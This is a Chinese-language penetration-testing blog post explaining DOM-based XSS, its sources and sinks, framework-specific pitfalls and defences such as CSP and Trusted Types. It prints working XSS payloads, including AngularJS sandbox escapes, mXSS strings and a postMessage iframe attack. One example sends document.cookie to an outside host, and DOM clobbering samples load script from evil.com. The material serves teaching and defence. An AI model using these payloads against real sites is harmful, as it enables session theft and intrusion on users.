---
title: DOM型XSS深入分析
date: 2025-03-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: DOM 型 XSS 深入分析——Source/Sink 模型与常见危险 Sink 函数利用。
categories: 渗透测试
---

## 前言

DOM型XSS（DOM Based Cross-Site Scripting）是完全在客户端发生的跨站脚本攻击。与反射型和存储型XSS不同，DOM型XSS的恶意Payload不经过服务端处理，整个攻击过程在浏览器DOM环境中完成。即使服务端WAF配置完善，DOM型XSS仍可绕过所有检测。本文从Source/Sink模型出发，系统分析其攻击面、利用技巧及现代前端框架中的特殊场景。

**免责声明：本文仅供安全研究与学习参考，严禁利用文中技术进行非法攻击。作者对使用文中信息导致的任何后果不承担法律责任。**

## 一、Source/Sink 模型

DOM型XSS的核心在于数据流向：数据从**Source（源）**进入JavaScript环境，流经可能的过滤逻辑，最终到达**Sink（汇）**被以危险方式执行。

**常见Source：** `location.hash`（#后内容，不发送服务端）、`location.search`、`location.href`、`document.referrer`（来源页面URL）、`window.name`（跨域持久化）、`postMessage(data)`（跨窗口通信）、`localStorage/sessionStorage`、`document.cookie`、`XHR/Fetch Response`。

**常见Sink：** `innerHTML/outerHTML`（HTML注入可插事件处理器）、`document.write()`（写入文档流）、`eval()`（直接执行JS）、`new Function()`（函数构造器）、`setTimeout(str)/setInterval(str)`（字符串=eval）、`location.href=/assign()`（javascript: URL跳转）、`<script>.src`动态赋值、`import()`动态模块导入、jQuery `.html()/.append()`（innerHTML + 可能的script eval）。

```
数据流: Source ──无服务端参与──→ Sink ──→ XSS触发（无日志！）
  例: location.hash ──decodeURI──→ innerHTML ──→ alert(document.cookie)
```

## 二、四大Source深度分析

### 2.1 location.hash

hash部分不发送到服务端，WAF完全无法检测。

```javascript
// 漏洞代码
document.getElementById('content').innerHTML = location.hash.substring(1);
// Payload: https://example.com/page#<img src=x onerror=alert(1)>
```

**防御：** 限制hash为简单键值对，使用`textContent`替代`innerHTML`。

### 2.2 document.referrer

携带来源URL，攻击者可在来源URL中植入恶意代码。

```javascript
// 漏洞代码
document.write('<div>来源: ' + document.referrer + '</div>');
// 解析referrer参数: new URL(document.referrer).searchParams.get('msg') → innerHTML
```

> 可通过Referrer-Policy限制传递，但大量站点使用`unsafe-url`或默认策略。

### 2.3 window.name

在**同标签页跨域导航中保持**，不受同源策略限制，服务端完全不可感知。

**攻击链路：** `evil.com`设置`window.name = '<img src=x onerror=alert(1)>'` → 重定向到`victim.com` → 目标JS读取`window.name` → `innerHTML`写入 → XSS。

```javascript
// 漏洞代码: var data = window.name; if(data) $('#welcome').html(data);
```

### 2.4 postMessage

HTML5跨文档通信机制，既是Source也是Sink。未验证origin是主要问题。

```javascript
// 危险：未验证origin
window.addEventListener('message', e => el.innerHTML = e.data);
// 危险：indexOf可被 example.com.evil.com 绕过
window.addEventListener('message', e => {
    if (e.origin.indexOf('example.com') !== -1) eval(e.data.action);
});
```

**正确实现：**
```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.example.com') return; // 严格匹配
    var actions = { updateText: d => el.textContent = d };
    (actions[e.data?.type] || (() => {}))(e.data?.payload);
});
```

**攻击载荷：**
```html
<iframe id="v" src="https://victim.com/vuln.html"></iframe>
<script>
  v.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
</script>
```

## 三、三大核心Sink

### 3.1 innerHTML

最常用的DOM XSS Sink。`<script>`标签不被执行，但事件处理器、SVG、iframe均可绕过：

```javascript
el.innerHTML = '<img src=x onerror=alert(1)>';         // img onerror
el.innerHTML = '<svg onload=alert(1)>';                 // SVG onload
el.innerHTML = '<body onload=alert(1)>';                // body事件
el.innerHTML = '<iframe srcdoc="<script>alert(1)<\/script>">'; // srcdoc
el.innerHTML = '<details open ontoggle=alert(1)>';      // toggle
el.innerHTML = '<div style="animation:1s x" onanimationend=alert(1)>'; // CSS动画
```

**常用XSS事件：** `onerror`（资源加载失败）、`onload`（加载完成）、`onfocus`+`autofocus`、`ontoggle`、`onanimationend`。

### 3.2 document.write

页面解析期间调用时直接写入HTML到文档流。配合**DOM Clobbering**可操控其参数引用的全局变量：

```javascript
// 代码依赖全局变量 config.url: document.write('<script src="' + config.url + '"></script>');
```

**DOM Clobbering攻击载荷：**
```html
<form id="config"><input name="url" value="https://evil.com/payload.js"></form>
<!-- config 变成 HTMLFormElement；config.url 变成 input 元素 -->
```

### 3.3 eval 及类eval函数

```javascript
eval(userInput);                                  // 直接
new Function(userInput)();                        // 构造器
setTimeout("alert('" + userInput + "')", 1000);   // 字符串 → eval
(0, eval)(userInput);                            // 间接eval
import('data:text/javascript,' + userInput);      // 动态导入
```

**引号逃逸示例：** `eval('var name="' + input + '";')` → input: `"+alert(1)+"` → `var name=""+alert(1)+"";`

## 四、DOM Invader 工具

DOM Invader是Burp Suite内置浏览器中的DOM型XSS检测工具。

**工作原理：** （1）Hook所有Source API，自动注入Canary金丝雀值；（2）监控数据流，Canary到达Sink时记录完整传播路径；（3）自动尝试将Canary替换为XSS Payload验证利用性。

**使用步骤：** Burp代理开启 → 内置浏览器打开目标 → DOM Invader面板Toggle On → 浏览目标触发操作 → Findings标签查看漏洞 → 点击`Exploit`验证。

**核心配置：**
| 配置 | 作用 |
|------|------|
| `Augmented DOM` | 注入Canary到所有Source |
| `PostMessage` | 拦截postMessage消息注入Canary |
| `Message Queue` | 自动捕获到达的postMessage |

**实战：** 检测postMessage漏洞——自动发送含Canary的postMessage，到达innerHTML即发现；检测hash-based XSS——URL中加Canary作hash并追踪流向。

## 五、前端框架XSS场景

### 5.1 AngularJS (1.x)

AngularJS表达式引擎存在丰富的沙箱逃逸历史（多数在1.7+修复）：

```javascript
// 沙箱逃逸（历史CVE）
{{ constructor.constructor('alert(1)')() }}                    // 1.0-1.1.5
{{'a'.constructor.prototype.charAt=''.valueOf;                 // 1.4.0-1.4.9
  $eval("x='\"+(y).fromCharCode)\"alert(1)\\\"')"}}
```

**持续风险点：** `$sce.trustAsHtml(userInput)`、`$compile('<div>' + userInput + '</div>')($scope)`、`$templateCache.put('tpl', userInput)`。
### 5.2 Vue.js

Vue默认转义`{{ }}`插值，但以下场景仍有XSS：

```vue
<div v-html="userProvidedContent"></div>   <!-- 最常见漏洞 -->
<script>new Vue({ template: '<div>' + userInput + '</div>' });</script>
<a :href="userUrl">链接</a>  <!-- javascript:alert(1) -->
```

**防护：** `v-text`代替`v-html`；URL协议白名单`/^https?:/.test(url)`；DOMPurify过滤。

### 5.3 React

JSX默认转义，但以下API绕过：

```jsx
<div dangerouslySetInnerHTML={{__html: userInput}} />   // 名称已警告
<a href={userUrl}>                                       // javascript:协议
const ref = useRef(null);
useEffect(() => { ref.current.innerHTML = userInput; }); // 绕过JSX转义
```

## 六、jQuery 不安全方法

jQuery 3.0前，`html()`/`append()`等方法通过正则提取`<script>`并用`$.globalEval()`执行：

```javascript
// jQuery < 3.0 内部: 正则提取script标签后用 $.globalEval(script[1])
```

**风险矩阵：**

| 方法 | 风险 | 说明 |
|------|------|------|
| `.html()` `.append()` `.prepend()` `.after()` `.before()` `.replaceWith()` | **高** | innerHTML + script eval（3.0前） |
| `.wrap()` | 中 | DOM破坏 |
| `.text()` | 低 | textContent |
| `.attr()` | 中 | 设onclick等事件属性时危险 |

**经典漏洞：**
```javascript
// 选择器注入 (jQ < 3.5.0): $(location.hash); → #<img src=x onerror=alert(1)>
// html()过滤绕过 (CVE-2020-11022/23): .html("<option><style></option></select><img src=x onerror=alert(1)>")
// $.parseHTML不移除事件处理器: $.parseHTML('<img src=x onerror=alert(1)>') → append → XSS
```
> jQuery 3.5.0：选择器以`<`开头必须含`>`才解析为HTML。

## 七、攻击流程图

```
                   ┌─────────────┐
                   │  攻击者输入   │
                   └──────┬──────┘
                          │
   ┌──────────────────────┼──────────────────────┐
   ▼                      ▼                      ▼
location.hash    document.referrer    window.name/postMessage
   │                      │                      │
   └──────────────────────┼──────────────────────┘
                          │
                          ▼
               ┌─────────────────────┐
               │  JavaScript 处理层   │
               └──────────┬──────────┘
                          │
   ┌──────────────────────┼──────────────────────┐
   ▼                      ▼                      ▼
innerHTML/         document.write/       eval/Function/
dangerously...     .html()/.append()     setTimeout(str)
   │                      │                      │
   └──────────────────────┼──────────────────────┘
                          ▼
                    ⚠ XSS触发 ⚠
        Cookie窃取 / 钓鱼 / 键盘记录 / 内网探测
```

## 八、常见陷阱与绕过

### 8.1 过滤缺陷

```javascript
// 黑名单绕过: <scr<script>ipt>过滤后→ <script>
// 事件处理器无需script: <img src=x onerror=...>
// 二次URL解码: %253C → decodeURI → %3C → 再解码 → <
// 属性中HTML实体解码: escapeHtml(url) → href="javascript:alert(1)" → 浏览器解码执行
```

### 8.2 DOM Clobbering（DOM破坏）

利用HTML命名属性污染JS全局作用域：

```html
<form id="config"><input name="url" value="https://evil.com/payload.js"></form>
<!-- 代码中 config.url 不再是字符串，而是HTMLInputElement -->
<!-- 双层嵌套: <a id="cfg" href="x"><a id="url" href="y:"> → 复杂引用 -->
```

### 8.3 Mutation XSS（mXSS）

浏览器修复畸形HTML时可能使无害字符串被重新解析为可执行代码：

```html
<style><!-- </style><img src=x onerror=alert(1)> --></style>
<!-- 在特定解析模式下，注释结束符 --> 导致后续被解析执行 -->
<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
```

### 8.4 Script Gadgets

利用框架将HTML字符串转变为可执行代码的路径（绕过CSP）：

```javascript
// AngularJS指令: '<div ng-click="constructor.constructor(\'alert(1)\')()">'
// lit-html: html`<div>${unsafeHTML(userInput)}</div>`  // unsafeHTML指令
```

## 九、完整攻击示例

### 示例1：hash → innerHTML
```javascript
// 漏洞页面: https://victim.com/search
document.getElementById('r').innerHTML = '结果: ' + decodeURIComponent(location.hash.slice(1));
// Payload: https://victim.com/search#<img src=x onerror=alert(document.cookie)>
```

### 示例2：postMessage → eval
```javascript
// 漏洞页面: new Function('return ' + JSON.parse(e.data).expr)();
// 攻击: iframe.postMessage('{"expr":"(()=>alert(1))()"}', '*')
```

### 示例3：React dangerouslySetInnerHTML
```jsx
function Profile({ bio }) { return <div dangerouslySetInnerHTML={{__html:bio}}/>; }
// bio = "<img src=x onerror=\"fetch('//e.com?c='+document.cookie)\">"
```

### 示例4：Vue v-html + API
```vue
<div v-html="content"></div>   <!-- API返回未过滤HTML → DOM XSS -->
```

## 十、纵深防御

### CSP与Trusted Types

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{rnd}' 'strict-dynamic';
  object-src 'none'; base-uri 'self'; require-trusted-types-for 'script';
```

```javascript
// Trusted Types — 直接字符串赋值innerHTML会抛出TypeError
el.innerHTML = userInput;  // ❌ TypeError!
const policy = trustedTypes.createPolicy('default', {
    createHTML: input => DOMPurify.sanitize(input)
});
el.innerHTML = policy.createHTML(userInput);  // ✓ 安全
```

### 安全编码清单
```
✓ textContent / innerText     替代 innerHTML
✓ DOMPurify.sanitize()        替代 直接HTML赋值
✓ createElement + textContent 替代 document.write
✓ encodeURIComponent()        替代 URL字符串拼接
✓ e.origin 精确匹配            替代 indexOf/正则
✓ 白名单验证                   替代 黑名单过滤
```

## 总结

DOM型XSS因其纯客户端执行特性，在安全检测链条中常被忽视。核心防御原则：

1. **永不将不可信数据传入代码执行Sink**（eval、Function、setTimeout字符串参数）
2. **永不将不可信数据作为HTML插入DOM**（innerHTML、document.write、v-html、dangerslySetInnerHTML）
3. **URL上下文严格验证协议白名单**（禁止`javascript:`和`data:`协议）
4. **部署严格CSP与Trusted Types**
5. **使用DOM Invader等自动化工具在开发生命周期各阶段检测DOM XSS**

DOM XSS恶意载荷不经过服务端，服务端日志不会留下任何痕迹。攻击者尤其青睐此类攻击进行精准钓鱼和水坑攻击。

*本文所有技术细节仅用于安全研究和防护建设。任何利用文中技术进行的未授权测试或攻击行为，后果由行为人自行承担。*
